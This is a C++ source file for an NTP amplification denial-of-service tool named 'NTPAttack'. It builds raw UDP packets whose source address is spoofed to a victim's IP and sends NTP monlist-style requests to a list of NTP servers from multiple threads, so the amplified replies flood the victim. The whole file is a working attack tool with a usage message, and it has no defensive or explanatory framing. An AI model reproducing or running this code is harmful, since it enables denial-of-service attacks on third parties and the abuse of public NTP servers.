#include <sys/socket.h>
#include <netinet/in.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/time.h>
#include <time.h>
#include <netinet/ip.h>
#include <netinet/if_ether.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>

using namespace std;

/*
  Define
*/
typedef unsigned int UINT;
typedef unsigned long ULONG;
typedef unsigned short USHORT;
typedef unsigned char UCHAR;

char ** NTP_SERVERS_ARR;
int NTP_SERVER_COUNT;
char TARGET_IP[200];
int NUM_THREADS;
double SEND_PACKAGE;
int CURRENT_SERVER;
int ATTACK_TIME;
bool EXIT_FLAG;
int ALIVE_THREADS;
struct timeval ATTACK_START_TIME;
/*
  udp checksum
*/
unsigned short check_sum(unsigned short *a, int len)
{
    unsigned int sum = 0;

    while (len > 1) {
        sum += *a++;
        len -= 2;
    }

    if (len) {
        sum += *(unsigned char *)a;
    }

    while (sum >> 16) {
        sum = (sum >> 16) + (sum & 0xffff);
    }

    return (unsigned short)(~sum);
}

/*
  Calculate running time Function
*/
double difftimeval(const struct timeval *start, const struct timeval *end)
{
        double d;
        time_t s;
        suseconds_t u;
        s = start->tv_sec - end->tv_sec;
        u = start->tv_usec - end->tv_usec;
        d = s;
        d *= 1000000.0;
        d += u;
        return d;
}

char *strftimeval(const struct timeval *tv, char *buf)
{
        struct tm      tm;
        size_t         len = 28;

        localtime_r(&tv->tv_sec, &tm);
        strftime(buf, len, "%Y-%m-%d %H:%M:%S", &tm);
        len = strlen(buf);
        sprintf(buf + len, ".%06.6d", (int)(tv->tv_usec));
        return buf;
}

char* i2cp(int n)
{
	int nLen=sizeof(n);
	char* atitle=new char[nLen];
	sprintf(atitle,"%d",n);
	return atitle;
}

char * GetNtpServers(char filename[])
{
  char * NtpServers = NULL;
  FILE *fp = NULL;
  if((fp = fopen(filename,"r")) == NULL)
  {
    return NULL;
  }

  fseek(fp,0,SEEK_END);
  ULONG filesize = ftell(fp);

  NtpServers = (char *)malloc(filesize);
  memset(NtpServers,0,filesize);
  fseek(fp,0,SEEK_SET);

  if(fread(NtpServers,1,filesize,fp) > filesize)
  {
    fclose(fp);
    return NULL;
  }

  fclose(fp);
  return NtpServers;
}

//Split characters and return character array
char ** GetNtpServersArr(char* s,const char* d)
{
    char* s_s=new char[strlen(s)];
    strcpy(s_s,s);
    //Count the number of character arrays
    int rows=0;
    char *p_str=strtok(s_s,d);
    while(p_str)
    {
        rows+=1;
        p_str=strtok(NULL,d);
    }
    char **strArray=new char*[rows+1];
    for(int i=0;i<rows;i++)
    {
        strArray[i]=NULL;
    }
    strArray[0]=i2cp(rows);  //Total length of the array
    int index=1;
    s_s=new char[strlen(s)];
    strcpy(s_s,s);
    p_str=strtok(s_s,d);
    while(p_str)
    {
        char* s_p=new char[strlen(p_str)];
        strcpy(s_p,p_str);
        //Add to two-dimensional array
        strArray[index]=s_p;
        index+=1;
        p_str=strtok(NULL,d);
    }
    return strArray;
}


// Sending thread
void* SendNTP(void* args)
{

  extern int errno;
  int sockfd,n;
  sockaddr_in servaddr,cliaddr;

  UCHAR ntp_magic[8];
  ntp_magic[0] = 0x17;
  ntp_magic[1] = 0x00;
  ntp_magic[2] = 0x03;
  ntp_magic[3] = 0x2A;
  ntp_magic[4] = 0x00;
  ntp_magic[5] = 0x00;
  ntp_magic[6] = 0x00;
  ntp_magic[7] = 0x00;

  int ret = 0;

  sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
  if(sockfd < 0)
   {
       perror("[*] socket error\n");
       exit(1);
   }

  //Set socket options IP_HDRINCL
  const int on = 1;
  if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
  	printf("[*] setsockopt error!\n");
  }
  /*Obtain super user permissions*/
  if(setuid(getuid()) != 0)
  {
    printf("[*] setuid error!\n");
  }

   //Prepare servaddr,cliaddr structure
   bzero(&servaddr, sizeof(servaddr));
   servaddr.sin_family = AF_INET;
   servaddr.sin_port = htons(123);

   bzero(&cliaddr, sizeof(cliaddr));
   cliaddr.sin_family = AF_INET;
   cliaddr.sin_port = htons(65511);
   cliaddr.sin_addr.s_addr = inet_addr(TARGET_IP);

  /*The length of the datagram NTP*/
  double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);

  char buffer[500];
  struct ip *ipp;
  struct udphdr *udp;
  bzero(buffer,500);

  /*Start filling the header of the IP datagram*/
  ipp = (struct ip *)buffer;
  ipp->ip_v=4; /*IPV4*/
  ipp->ip_hl=sizeof(struct ip)>>2;  /*IP Header length of datagram*/
  ipp->ip_tos=0;                /*Service type*/
  ipp->ip_len=pack_len;  /*IP The length of the datagram*/
  ipp->ip_id=0;
  ipp->ip_off=0;
  ipp->ip_ttl=255;
  ipp->ip_p=IPPROTO_UDP;
  ipp->ip_src=cliaddr.sin_addr; /*Source address, the attack target*/
  ipp->ip_dst=servaddr.sin_addr;     /*The destination address, that is, the attack target*/
  ipp->ip_sum=0;

  //Fill UDP header
  udp = (struct udphdr*)(buffer + sizeof(struct ip));
  udp->uh_sport = cliaddr.sin_port;
  udp->uh_dport = servaddr.sin_port;
  udp->uh_ulen = htons(sizeof(struct udphdr) + 8 * sizeof(UCHAR)) ;
  //udp->uh_sum = 0;
  udp->uh_sum=check_sum((unsigned short *)udp,sizeof(struct udphdr));

  //Fill the NTP header
  memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , ntp_magic , 8 * sizeof(UCHAR));

  ALIVE_THREADS++;
  //Enter the outsourcing cycle
  while(true)
  {
    if(EXIT_FLAG)
    {
      ALIVE_THREADS--;
      pthread_exit(NULL);
    }
    if(CURRENT_SERVER > NTP_SERVER_COUNT) //Thread shared use CURRENT_SERVER
    {
      CURRENT_SERVER = 1;
    }
    servaddr.sin_addr.s_addr = inet_addr(NTP_SERVERS_ARR[CURRENT_SERVER]);
    CURRENT_SERVER++; //Self-increasing rapidly
    ipp->ip_dst=servaddr.sin_addr;
    sendto(sockfd,buffer,pack_len,0,(struct sockaddr *)&servaddr,sizeof(servaddr));
    SEND_PACKAGE++;
    //usleep(1);
  }
}

// Monitor thread
void* Mon(void* args)
{
  double time_range;
  double attack_time;
  double per_second;
  struct timeval start,end;
  double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);
  ALIVE_THREADS++;

  while(true)
  {
    if(EXIT_FLAG)
    {
      ALIVE_THREADS--;
      return NULL;
    }
    int send_package = 0;
    SEND_PACKAGE = 0;
    gettimeofday(&start, NULL);//Get start time
    usleep(800000);
    gettimeofday(&end, NULL);  //Get end time
    attack_time = difftimeval(&end, &ATTACK_START_TIME); //Calculate attack time
    if( attack_time > (ATTACK_TIME * 1000 * 1000) )
    {
      EXIT_FLAG = true;
      printf("[*] Time up & Program Stop ...\n");
      pthread_exit(NULL);
    }
    send_package = SEND_PACKAGE;  //Take the total number of packages sent in the current time period
    time_range = difftimeval(&end, &start); //Calculate running time in microsecond level
    per_second = ( ntp_buffer_size / 1000000 * send_package ) / (time_range / 1000000 );
    printf(" [>] Speed %f M/S ,Send %d Pack , Current Server => %d\n",per_second,send_package,CURRENT_SERVER);
  }
}

void ShowBanner()
{
  printf("*-----------------------------------------------------*\n");
  printf("                       NTPAttack                       \n");
  printf("                 NTP Amplification DoS                 \n");
  printf("*-----------------------------------------------------*\n");
}

int main(int argc, char* argv[])
{
  ShowBanner();
  if(argc < 3)
  {
    printf("USAGE: ./NTPAttack [target] [threads] [time] \n\n");
    printf("[target]:     Target ipv4 address.\n");
    printf("[threads]:    Number of threads.\n");
    printf("[time]:       The duration of the attack (default 30 seconds).\n\n");
    printf("Important:    This Program needs file \"ntp.list\" in current folder, which has some ntp server ip.\n");
    return 0;
  }
  if(argc >= 4)
  {
    ATTACK_TIME = atoi(argv[3]);  //Attack time (seconds)
  }
  else
  {
    ATTACK_TIME = 30; //default 30s
  }
  strcpy(TARGET_IP,argv[1]);
  NUM_THREADS = atoi(argv[2]);
  if(NUM_THREADS < 1)
  {
    NUM_THREADS = 1;
    printf("[!] Threads value at least 1\n");
  }
  SEND_PACKAGE = 0;

  printf("[*] Attack Target: %s\n",TARGET_IP);
  printf("[*] Threads: %s\n",argv[2]);
  printf("[*] Attack Time: %ds\n",ATTACK_TIME);

  if(GetNtpServers("ntp.list") == NULL)
  {
    printf("[?] Can't find file \"ntp.list\"\n");
    return 0;
  }
  //Read ntpservers list
  NTP_SERVERS_ARR = GetNtpServersArr(GetNtpServers("ntp.list"),"\n");
  NTP_SERVER_COUNT = atoi(NTP_SERVERS_ARR[0]) - 1;

  printf("[*] Load NTP Server: %d\n",NTP_SERVER_COUNT);

  EXIT_FLAG = false;
  int ti = 0;
  pthread_t tids[NUM_THREADS+1];
  //Create observation thread
  ALIVE_THREADS = 0; //Number of surviving threads
  int ret = pthread_create(&tids[ti], NULL, Mon, NULL);
  if (ret == 0)
  {
     printf("[*] Mon Thread created\n");
     ti++;
  }
  //Create a sending thread
  CURRENT_SERVER = 1;
  gettimeofday(&ATTACK_START_TIME, NULL);//Get start time
  for(ti = 1; ti <= NUM_THREADS; ++ti)
  {
      ret = pthread_create(&tids[ti], NULL, SendNTP, NULL);
      if (ret == 0)
      {
        printf("[*] Attack Thread [%d] created\n",ti);
        usleep(10000);
      }
  }
  pthread_exit(NULL);
}
